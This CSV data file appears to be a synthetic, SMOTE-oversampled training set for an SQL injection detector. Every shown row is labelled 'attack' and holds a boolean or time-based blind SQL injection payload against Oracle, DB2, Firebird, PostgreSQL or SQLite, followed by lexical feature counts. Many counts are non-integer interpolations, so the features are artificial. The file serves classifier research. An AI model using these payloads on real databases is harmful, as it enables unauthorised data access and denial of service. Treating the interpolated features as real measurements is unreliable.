id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000028,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000024,3.1978239454346906,133.16675900752804,32.10606900068437,3.6873362065942445,46.21596575461949,11.420448249486723,54.26517250171092,21.26517250171092,0.3394580841066851,0.09014648408179898,0.4126326908984254,0.15776274091309048,0.4734827498289078,1.5795517505132763,0.9469654996578155,0.0,0.47348274982890776,1.0,0.0,10.579551750513275,0.0,1.5265172501710924,1.0,5.579551750513277,0.47348274982890776,0.5265172501710922,0.4734827498289078,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.5265172501710922,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000029,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000025,2.4808926951813124,85.29424146491465,26.08024767224945,3.621211168982745,26.64712073245732,13.0,33.647120732457324,12.0,0.30922126456061855,0.1550077225444974,0.39268696131534797,0.14308405157953608,2.4598761638752755,1.1102230246251565e-16,0.0,0.0,0.5133746120415748,1.4866253879584252,0.0,5.5401238361247245,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5133746120415748,0.0,0.0,0.5133746120415748,1.486625387958425,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.513374612041575
SMOTE_000030,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000028,1.1272632709031234,131.43893351607719,29.513995075264976,4.074702338954064,74.51399507526497,6.784987688162443,33.597965526854836,16.54198522579493,0.5712241354407088,0.05045154934311266,0.25331496948760357,0.12500934572857494,3.7569975376324884,1.1102230246251565e-16,0.0,0.0,1.0,1.7569975376324884,0.0,3.5139950752649773,1.513995075264977,0.0,2.0,2.7569975376324884,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.7569975376324884,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7569975376324884
SMOTE_000031,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000008,1.0917616912635304,147.8796886556919,31.28270817924108,4.190208580414168,83.02104274531243,9.0,39.57593773113838,16.28270817924108,0.5609077963487927,0.06094236059747027,0.2677137339971892,0.11043610905654774,0.8586459103794598,0.1413540896205402,0.28270817924108027,0.0,1.0,1.0,0.0,5.0,0.14135408962054016,0.0,3.0,2.28270817924108,0.8586459103794598,0.14135408962054016,0.14135408962054014,0.8586459103794597,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.8586459103794598,0.1413540896205402,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000032,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000013,2.259691983894116,90.32576941147067,22.0,2.9565420043712103,11.257694114706787,15.022691765587963,47.34846117705864,16.696922354117284,0.1243695134349018,0.1664017030915001,0.5242642947722449,0.1849644887013533,2.6969223541172846,1.3030776458827158,0.674230588529321,0.0,0.3257694114706789,1.6742305885293212,0.0,8.0,1.348461177058642,0.0,0.674230588529321,2.674230588529321,0.674230588529321,0.3257694114706789,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.325769411470679,0.6742305885293212,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000033,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000011,0.17578718809960772,142.11960361122368,30.099669676019744,3.8985288747193287,48.29900902805923,15.880396388776308,51.98006606479605,25.960132129592104,0.3397753287326643,0.11177686664572976,0.3657665584991153,0.18268124612249062,0.05980180561184656,3.9202642591842043,0.0,0.0,0.0,1.9601321295921024,0.0,10.019933935203948,0.0,2.0,1.0,7.960132129592102,0.01993393520394887,0.9800660647960512,0.0,0.0,0.0,0.9800660647960512,1.0,0.0,0.0,0.0,0.9999999999999998,0.019933935203948927,0.0,0.0,0.01993393520394887,1.980066064796051,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.019933935203949
SMOTE_000034,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000020,1.913832433222874,139.67636863551746,33.0,4.210169679377078,70.41545392056031,13.09182255607779,39.33818431775874,16.83090784112063,0.5046394253381975,0.09310068517745893,0.28146227626953035,0.1207976132148133,0.0,1.0,2.0,0.0,1.0,1.5845460794396844,0.0,5.0,0.4154539205603156,0.0,2.4154539205603154,4.584546079439685,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5845460794396844,1.0,0.5845460794396844,0.4154539205603157,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5845460794396846
SMOTE_000035,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000006,1.056368916059688,160.78103565696387,37.39051782848194,4.016745579065711,53.0665938001566,21.01918294256631,57.304741085759034,29.39051782848194,0.3304543186413038,0.13023664488478326,0.3566157216388497,0.18269331483506324,2.542888371361456,0.45711162863854415,1.6952589142409704,0.0,0.0,1.8476294571204854,0.0,11.152370542879515,0.0,2.0,1.0,11.238147285602427,0.8476294571204853,0.15237054287951465,0.8476294571204853,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,1.0,0.0,0.8476294571204854,0.15237054287951463,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000036,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000008,0.5917857364657119,146.43987338299908,30.726144106384545,4.184041620991247,83.90457642553818,8.452288212769089,38.448149936179085,15.634858808512725,0.5749728063829312,0.056990052340442736,0.26123889219861257,0.10679824907801344,1.1825705957436372,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.7261441063845435,0.0,0.0,2.908714702128181,2.0,1.0,0.0,0.0,0.9087147021281813,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000037,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000005,0.25976368871022476,138.0816903178372,32.0,4.198312109060864,69.0,16.0,38.665352254269756,14.416338063567439,0.49986250354970974,0.11591014575065732,0.27985322094392523,0.1043741297557077,0.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.416338063567439,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000038,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000029,0.994585930738022,137.99763584836495,36.334909434423366,4.025556726698994,50.82427075206565,20.168636793029208,48.503546227452574,18.501182075817525,0.36741545649327967,0.14640155621608583,0.35195263338996247,0.13423035390067206,3.334909434423365,0.16627264139415887,0.3325452827883174,0.0,1.0,2.0,0.0,7.501182075817524,0.0,0.8337273586058412,1.1662726413941589,5.0,0.8337273586058414,0.16627264139415873,0.16627264139415873,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.8337273586058416,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.833727358605842
SMOTE_000039,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000014,1.469861900696571,78.06806463166164,22.760702080490493,3.490827287492464,20.282106241471478,13.0,32.307362551171146,12.478595839019016,0.26320856914226237,0.16782226905084627,0.40879700313337375,0.1601721586735176,3.0428083219619673,0.9571916780380325,0.0,0.0,0.23929791950950813,1.7607020804904918,0.0,4.957191678038033,0.0,0.7607020804904919,0.7607020804904919,2.0,0.7607020804904918,0.23929791950950816,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000040,attack,boolean,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000015,1.2878421372528703,132.2183524591712,31.3013108899408,3.4958564567151957,35.0,15.0,59.615730679289605,22.602621779881602,0.26531457217919274,0.11370624521965404,0.44996620759438166,0.17101297500677148,4.794756440236799,1.2052435597632016,0.0,1.0,0.0,2.0,0.0,10.6026217798816,2.0,0.0,1.0,3.0,1.0,0.3013108899408004,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000041,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R000022,3.63139741878426,165.65606603680908,35.56262264212727,3.9469680113503616,56.87475471574545,18.73458962372273,60.656066036809094,29.39065566053182,0.34301862250281784,0.11349625221180457,0.3659570448950968,0.17752808039028078,1.1719669815954554,1.8280330184045446,0.7813113210636369,0.0,0.0,1.3906556605318183,0.0,12.828033018404543,0.6093443394681816,2.0,2.828033018404545,7.734589623722728,0.39065566053181844,0.6093443394681816,0.39065566053181844,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.39065566053181844,0.0,0.3906556605318185,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8280330184045446,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6093443394681817
SMOTE_000042,attack,boolean,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000016,1.0813055597545456,134.50791816073715,30.53096434524258,3.3411327360017653,32.502639386912385,14.706192869048516,64.76812155953368,22.53096434524258,0.23932809606220076,0.11110204418772883,0.48278399833800145,0.16678586141206891,1.706192869048516,4.0,0.0,0.853096434524258,0.14690356547574202,1.853096434524258,0.0,11.412385738097033,1.706192869048516,0.0,0.853096434524258,2.8530964345242578,0.853096434524258,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000043,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000009,2.114187040508832,73.28238842888271,25.15283471335189,3.762793401446025,15.976719002178921,20.893727282290264,25.129553715530815,11.282388428882703,0.21776139377169632,0.2855358699211411,0.34277676766763504,0.1539259686395275,1.1295537155308124,0.717611571117297,2.152834713351891,0.0,0.0,2.0,0.0,3.282388428882703,0.0,1.0,1.0,4.152834713351891,0.2823884288827031,0.7176115711172969,0.7176115711172969,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.717611571117297,0.0,0.5647768577654063,0.7176115711172969,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000044,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'qomf' like 'qomf",nearest_attack_euclidean,R000012,1.6163028807135154,149.3511397365881,34.77481004390198,4.009909565716308,62.09924017560793,10.0,52.801519648784144,24.450379912196034,0.4160918630477765,0.06697475441532638,0.3532694270557239,0.16366395548117316,2.324430131705946,0.675569868294054,0.0,0.0,0.0,0.22518995609801795,0.0,11.225189956098017,0.0,2.0,1.0,6.225189956098018,0.774810043901982,0.2251899560980179,0.0,0.0,0.0,0.22518995609801795,1.0,0.0,0.0,0.0,0.9999999999999998,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000045,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000020,1.3142597992633236,142.2024496643512,32.601224832175596,4.1689332037341025,69.6012248321756,16.0,41.0,15.601224832175596,0.48945115679693135,0.11252099416606562,0.2883350475505431,0.1096928014864599,0.0,0.6012248321755953,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.0,0.6012248321755952,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.6012248321755953,0.3987751678244047,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000046,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000021,1.2646449653448666,144.9967012533334,32.33223375111113,4.0715223262251214,71.89035499851849,8.777411250370378,44.774112503703776,19.554822500740755,0.49645649195482333,0.060500302796236076,0.3082396519342298,0.1348035533147108,1.667766248888866,1.1102230246251565e-16,1.5548225007407557,0.0,1.0,1.2225887496296222,0.0,6.332233751111135,1.222588749629622,0.0,2.7774112503703776,3.777411250370378,1.0,0.0,0.7774112503703778,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.44517749925924394,0.7774112503703778,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.222588749629622
SMOTE_000047,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000021,2.1743091489518074,142.06534253997532,32.55139477636139,4.153717634250025,70.10278955272278,12.140236565470255,42.51394776361392,17.30836865816835,0.4939211056378552,0.08653594899281461,0.2983432984129855,0.12119964695634462,0.5513947763613921,1.1102230246251565e-16,2.0,0.0,1.0,1.4486052236386078,0.0,5.654184329084177,0.5513947763613921,0.0,2.5513947763613922,4.448605223638608,0.5513947763613921,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.44860522363860794,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4486052236386078
SMOTE_000048,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000005,2.3152632719274213,117.01832071137186,30.192221020130653,4.113061942850653,52.428692684530986,18.41037197315913,33.08314554361642,13.096110510065326,0.4122721672050318,0.1812567946180189,0.28914483557726367,0.11732620259968557,0.0,0.3012964966448912,2.301296496644891,0.0,0.6987035033551088,2.0,0.0,3.6987035033551092,0.0,0.30129649664489117,1.6987035033551088,5.0,0.0,0.3012964966448913,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6987035033551087,0.0,1.0,0.6987035033551088,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3974070067102176
SMOTE_000049,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000011,1.376232126944916,145.9141235870935,31.304707862364506,3.8841167282105826,51.5879466215024,14.04293820645324,54.28323875913789,26.0,0.3527350689625412,0.09710404462789755,0.37171599950927003,0.17844488690029123,0.0,3.673823034408873,0.0,0.0,0.0,1.6738230344088731,0.0,10.652353931182253,0.0,2.0,1.0,7.673823034408873,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.32617696559112686,0.0,0.0,0.3261769655911268,1.6738230344088731,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.326176965591127
SMOTE_000050,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,1.5043117925104106,86.08462482323922,23.72637497474846,3.3600244138196373,20.179124924245382,13.0,39.45274994949692,13.452749949496923,0.23414504377743686,0.151220521506438,0.45853773886450055,0.15609669585162458,2.905499898993845,1.094500101006155,0.0,0.0,0.2736250252515387,1.7263749747484614,0.0,6.0,0.0,0.7263749747484612,0.7263749747484612,2.0,0.7263749747484612,0.27362502525153876,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000051,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000014,0.8302006602258244,74.10771419168452,22.89228580831547,3.6028087225112535,20.569143233261887,13.10771419168453,28.21542838336906,12.215428383369058,0.27763145968216296,0.17685956138608222,0.3807073338742601,0.16480164505749476,3.5691432332618858,1.1102230246251565e-16,0.0,0.0,0.0,1.8922858083154714,0.0,4.107714191684528,0.0,1.0,1.3231425750535855,1.8922858083154717,0.8922858083154714,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8922858083154717,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.10771419168452846,0.10771419168452842,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1077141916845283
SMOTE_000052,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,4.167229702377799,76.50248921772987,16.64159309934712,2.5349619462928032,13.181692668056314,7.0212943932195335,42.75940258774483,13.540099568709195,0.1580874244618738,0.07978743628658563,0.5813001188694715,0.18082502038206905,2.1603982748367794,1.8396017251632202,0.0,0.0,0.0,1.540099568709195,0.0,6.91980086258161,0.0,0.540099568709195,0.540099568709195,1.540099568709195,0.540099568709195,0.45990043129080505,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.08019913741839,0.4599004312908051,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.540099568709195
SMOTE_000053,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000027,0.02304160217166843,111.134110183168,28.009934087642076,4.202232671830406,73.00993408764208,3.024835219105187,23.069538613494522,12.029802262926225,0.6570905235903517,0.027180727168766933,0.2075097435621509,0.10821900567873058,3.004967043821037,1.1102230246251565e-16,0.0,0.0,1.0,1.0049670438210376,0.0,2.0099340876420753,0.009934087642074874,0.0,2.0,2.004967043821037,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0049670438210374,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0049670438210376
SMOTE_000054,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000010,0.06429709942524583,163.805270956734,34.0194729043266,4.072612621694192,81.8831625740404,16.019472904326598,48.883162574040405,17.019472904326598,0.4998735525693078,0.09781078638746507,0.2983996034709637,0.10391605757226338,0.019472904326599094,0.9805270956734012,2.0,0.0,1.0,2.0,0.0,5.980527095673401,0.0,0.0,2.019472904326599,5.0,0.01947290432659876,0.9805270956734011,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000055,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000010,0.16773054832924786,162.72529932987564,33.939299968089315,4.0752129616271295,81.27159961707179,16.0,48.514399744714524,16.939299968089315,0.4993632863785593,0.09843063323904103,0.29804800831354583,0.10415807206885391,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.9392999680893155,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.060700031910684515,0.9392999680893155,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
